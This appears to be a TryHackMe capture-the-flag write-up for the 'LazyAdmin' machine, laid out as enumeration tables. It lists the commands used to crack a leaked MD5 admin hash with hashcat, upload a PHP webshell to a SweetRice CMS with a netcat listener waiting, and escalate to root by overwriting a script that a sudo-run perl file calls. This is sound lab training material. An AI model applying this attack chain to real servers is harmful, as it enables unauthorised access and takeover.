TryHackMe LazyAdmin

Sonntag, 6. Dezember 2020

23:03

![lazyAdmin](/images/lazyAdmin.PNG "LazyAdmin")

Flags:
======

<table>
<thead>
<tr class="header">
<th>#</th>
<th>Found</th>
<th>Entry</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>User Flag</td>
<td>/home/itguy/user.txt</td>
<td>Port 88 - /content/as</td>
</tr>
<tr class="even">
<td>Root Flag</td>
<td>/root/root.txt</td>
<td>Port 88 - /content/as</td>
</tr>
</tbody>
</table>

 
=

Enumeration
===========

<table>
<thead>
<tr class="header">
<th>IP#1</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><table>
<thead>
<tr class="header">
<th>Port</th>
<th><blockquote>
<p>Service</p>
</blockquote></th>
<th><blockquote>
<p>Software/<br />
Version</p>
</blockquote></th>
<th><blockquote>
<p>Credentials</p>
</blockquote></th>
<th><blockquote>
<p>Done</p>
</blockquote></th>
<th><p>Flag/Step</p>
<p>Solution</p></th>
<th>Misc</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>22</td>
<td>SSH</td>
<td>OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)</td>
<td><table>
<thead>
<tr class="header">
<th>Username</th>
<th>???</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>Password</td>
<td>???</td>
</tr>
</tbody>
</table></td>
<td>yes</td>
<td> </td>
<td>Rabbit Hole </td>
</tr>
<tr class="even">
<td>80</td>
<td>HTTP</td>
<td>Apache httpd 2.4.18 ((Ubuntu))</td>
<td> </td>
<td>yes</td>
<td><p>User.txt</p>
<p>Root.txt</p></td>
<td> </td>
</tr>
</tbody>
</table></td>
</tr>
</tbody>
</table>

 

<table>
<thead>
<tr class="header">
<th>80</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><p>$gobuster dir -w /usr/share/wordlists/dirb/big.txt -u</p>
<table>
<thead>
<tr class="header">
<th>Path</th>
<th>Contents</th>
<th>Misc</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>/content</td>
<td><p>[…]</p>
<p>Powered by Basic-CMS.ORG SweetRice.</p></td>
<td> </td>
</tr>
<tr class="even">
<td>/content/attachment/</td>
<td>Landing Plattform for upload</td>
<td> </td>
</tr>
<tr class="odd">
<td>/content/inc</td>
<td>SweetRice Source &amp; Binaries</td>
<td> </td>
</tr>
<tr class="even">
<td>/content/inc/mysql_backup</td>
<td><ol type="1">
<li><blockquote>
<p>$cat mysql_bakup_20191129023059-1.5.1.sql</p>
</blockquote></li>
</ol>
<ol start="2" type="1">
<li><blockquote>
<p>INSERT INTO `%--%_options` VALUES(\'1\',\'global_setting\',\'a:17:{s:4:\\"name\\";s:25:\\"Lazy Admin&amp;#039;s <br>Website\\";s:6:\\"author\\";s:10:\\"Lazy Admin\\";s:5:\\"title\\";s:0:\\"\\";s:8:\\"keywords\\";s:8:\\<br>"Keywords\\";s:11:\\"description\\";s:11:\\"Description\\";s:5:\\"admin\\";s:7:\\"<strong>manager</strong><br>\\";s:6:\\"passwd\\";s:32:\\"<strong>42f749ade7f9e195bf475f37a44cafcb</strong>\\";s:5:\\"close\\";i:1;s:9:\\"close_tip<br>\\";s:454:\\"&lt;p&gt;Welcome to SweetRice - Thank your for install SweetRice as your website<br> management system.&lt;/p&gt;[…]</p>
</blockquote></li>
</ol>
<ol start="3" type="1">
<li><blockquote>
<p>$hashcat -a 0 -m 0 42f749ade7f9e195bf475f37a44cafcb /usr/share/wordlist/rockyou.txt</p>
</blockquote></li>
<li><blockquote>
<p>$hashcat --show</p>
</blockquote></li>
</ol>
<blockquote>
<p> </p>
<p>42f749ade7f9e195bf475f37a44cafcb:<strong>Password123</strong></p>
<p> </p>
</blockquote></td>
<td><table>
<thead>
<tr class="header">
<th>Username</th>
<th>manager</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>Password</td>
<td>Password123</td>
</tr>
</tbody>
</table></td>
</tr>
<tr class="odd">
<td>/content/as</td>
<td><p>SweetRice Management Page</p>
<p> </p>
<ol type="1">
<li><blockquote>
<p>Login with credentials manager:Password123</p>
</blockquote></li>
<li><blockquote>
<p>Go to Media Center -&gt; Upload and upload custom webshell e.g shell.php</p>
</blockquote></li>
<li><blockquote>
<p>$nc -lvnp &lt;port&gt;</p>
</blockquote></li>
<li><blockquote>
<p>Start shell by clicking on the uploaded file or move to /content/attachment/&lt;uploadedFile&gt;</p>
</blockquote></li>
</ol>
<ol start="5" type="1">
<li><blockquote>
<p>$cat /home/itguy/user.txt</p>
</blockquote></li>
</ol>
<p> </p>
<p><strong>Privilege Escalation</strong></p>
<ol type="1">
<li><blockquote>
<p>$sudo -l</p>
</blockquote></li>
<li><blockquote>
<p>$cat /home/itguy/backup.pl</p>
</blockquote></li>
<li><blockquote>
<p>$echo "/bin/sh" &gt; /etc/copy.sh</p>
</blockquote></li>
<li><blockquote>
<p>$sudo perl /home/itguy/backup.pl</p>
</blockquote></li>
<li><blockquote>
<p>$cat /root/root.txt</p>
</blockquote></li>
</ol>
<blockquote>
<p> </p>
</blockquote></td>
<td><p>User.txt Flag</p>
<p>Root.txt Flag</p></td>
</tr>
<tr class="even">
<td> </td>
<td> </td>
<td> </td>
</tr>
</tbody>
</table></td>
</tr>
</tbody>
</table>

 

Users
=====

<table>
<thead>
<tr class="header">
<th>ID</th>
<th>Username</th>
<th>Password</th>
<th>Hash</th>
<th>Hash Algorithm</th>
<th>Misc</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>-</td>
<td>manager</td>
<td>Password123</td>
<td>42f749ade7f9e195bf475f37a44cafcb</td>
<td><p>Possible algorithms: md5</p>
<p> </p></td>
<td>Administrator</td>
</tr>
</tbody>
</table>

 

**Legend**

<table>
<thead>
<tr class="header">
<th> </th>
<th><blockquote>
<p>Step Solution/Finding</p>
</blockquote></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td> </td>
<td><blockquote>
<p>Rabbit Hole</p>
</blockquote></td>
</tr>
</tbody>
</table>
